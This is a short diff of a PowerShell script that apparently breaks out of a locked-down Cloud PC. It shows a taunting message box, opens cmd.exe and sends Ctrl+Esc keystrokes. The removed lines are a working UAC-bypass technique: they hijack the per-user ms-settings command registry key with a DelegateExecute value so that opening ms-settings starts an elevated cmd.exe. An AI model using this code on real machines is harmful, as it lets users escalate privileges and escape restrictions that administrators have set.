@@ -4,9 +4,6 @@
 
 Add-Type -Assembly System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show('thx for the free Cloud PC m8','Nice!')
-New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
-New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
-Start-Process cmd.exe -Argument '/c start "" ms-settings:'
-Start-Process control.exe
+Start-Process cmd.exe
 (New-Object -ComObject "wscript.shell").SendKeys("^{ESC}") 
 
